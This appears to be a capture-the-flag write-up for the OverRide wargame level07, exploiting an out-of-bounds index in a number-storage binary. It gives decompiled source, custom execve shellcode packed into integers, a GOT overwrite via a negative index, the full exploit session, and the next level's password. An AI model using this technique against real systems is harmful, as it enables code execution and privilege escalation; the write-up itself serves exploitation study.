Upon login we're greeted by the usual message. This time we have a STACK CANARY.

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH
```

The binary is a **crappy number storage service** that let's you save a number at an index.

```shell
level07@OverRide:~$ ./level07
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------
Input command: store
Number: 123
Index: 3
*** ERROR! ***
This index is reserved for wil!
*** ERROR! ***
Failed to do store command
```

However we are unable to store data on every third index as they are reserved for will. Let's take a closer look at the source code to understand what exactly is happening.

```C
int clear_stdin()
{
  int result; // eax

  do
    result = getchar();
  while ( (_BYTE)result != 10 && (_BYTE)result != 0xFF );
  return result;
}

int get_unum()
{
  int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF

  v1[0] = 0;
  fflush(stdout);
  __isoc99_scanf(&unk_8048AD0, v1);
  clear_stdin();
  return v1[0];
}

int __cdecl read_number(int a1)
{
  int unum; // [esp+1Ch] [ebp-Ch]

  printf(" Index: ");
  unum = get_unum();
  printf(" Number at data[%u] is %u\n", unum, *(_DWORD *)(a1 + 4 * unum));
  return 0;
}

int __cdecl store_number(int a1)
{
  unsigned int unum; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  printf(" Number: ");
  unum = get_unum();
  printf(" Index: ");
  v3 = get_unum();
  if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 )
  {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  }
  else
  {
    *(_DWORD *)(a1 + 4 * v3) = unum;
    return 0;
  }
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v6[400]; // [esp+24h] [ebp-1B8h] BYREF
  int number; // [esp+1B4h] [ebp-28h]
  int v8; // [esp+1B8h] [ebp-24h] BYREF
  int v9; // [esp+1BCh] [ebp-20h]
  int v10; // [esp+1C0h] [ebp-1Ch]
  int v11; // [esp+1C4h] [ebp-18h]
  int v12; // [esp+1C8h] [ebp-14h]
  unsigned int v13; // [esp+1CCh] [ebp-10h]

  v13 = __readgsdword(0x14u);
  number = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  memset(v6, 0, sizeof(v6));
  while ( *argv )
  {
    memset(*argv, 0, strlen(*argv));
    ++argv;
  }
  while ( *envp )
  {
    memset(*envp, 0, strlen(*envp));
    ++envp;
  }
  puts(
    "----------------------------------------------------\n"
    "  Welcome to wil's crappy number storage service!   \n"
    "----------------------------------------------------\n"
    " Commands:                                          \n"
    "    store - store a number into the data storage    \n"
    "    read  - read a number from the data storage     \n"
    "    quit  - exit the program                        \n"
    "----------------------------------------------------\n"
    "   wil has reserved some storage :>                 \n"
    "----------------------------------------------------\n");
  while ( 1 )
  {
    printf("Input command: ");
    number = 1;
    fgets(&v8, 20, stdin);
    *((_BYTE *)&v8 + strlen((const char *)&v8) - 1) = 0;
    if ( !memcmp(&v8, "store", 5u) )
    {
      number = store_number(v6);
      goto LABEL_13;
    }
    if ( !memcmp(&v8, "read", 4u) )
    {
      number = read_number(v6);
      goto LABEL_13;
    }
    if ( !memcmp(&v8, "quit", 4u) )
      return 0;
LABEL_13:
    if ( number )
      printf(" Failed to do %s command\n", (const char *)&v8);
    else
      printf(" Completed %s command successfully\n", (const char *)&v8);
    v8 = 0;
    v9 = 0;
    v10 = 0;
    v11 = 0;
    v12 = 0;
  }
}
```

As we can see the command line arguments are useless, because ``argv`` is cleared in at the start of the program. Same goes for the environment. Since there is no function that would spawn a shell or access a file for us we need a different way to access the `.pass`. Fortunately for us the whole premise of this program is to store data. This allows us to simply provide our own shellcode. However we need to write a custom one as we can only use two index at a time and then skip one since every third is reserved for will.

Now let's build our payload and convert it into integers which we can use as input.

```
Buffer addr: 4294956356 hex: 0xffffd544
Puts addr: 134520852 hex: 0x804a014
Idx to puts: -1040108876.0
Payload addr: 4294956360 hex: 0xffffd548

\x31\xc0\x50\x90        2421211185
\x90\x90\xeb\x04        82546832

\x68\x2f\x2f\x73        1932472168
\x68\x90\xeb\x04        82546792

\x68\x2f\x62\x69        1768042344
\x6e\x90\xeb\x04        82546798

\x89\xe3\x89\xc1        3247039369
\x89\xc2\xeb\x04        82559625

\xb0\x0b\xcd\x80        2160921520
\x31\xc0\xeb\x04        82559025

\x40\xcd\x80\x90        2424360256
```

And now run it:

```shell
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956356
 Completed read command successfully
Input command: store
 Number: 2421211185
 Index: 1
 Completed store command successfully
Input command: store
 Number: 82546832
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1932472168
 Index: 4
 Completed store command successfully
Input command: store
 Number: 82546792
 Index: 5
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 7
 Completed store command successfully
Input command: store
 Number: 82546798
 Index: 8
 Completed store command successfully
Input command: store
 Number: 3247039369
 Index: 10
 Completed store command successfully
Input command: store
 Number: 82559625
 Index: 11
 Completed store command successfully
Input command: store
 Number: 2160921520
 Index: 13
 Completed store command successfully
Input command: store
 Number: 82559025
 Index: 14
 Completed store command successfully
Input command: store
 Number: 2424360256
 Index: 16
 Completed store command successfully
Input command: store
 Number: 4294956360
 Index: -1040108876
 Completed store command successfully
Input command: store
 Number: 1
 Index: 0
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```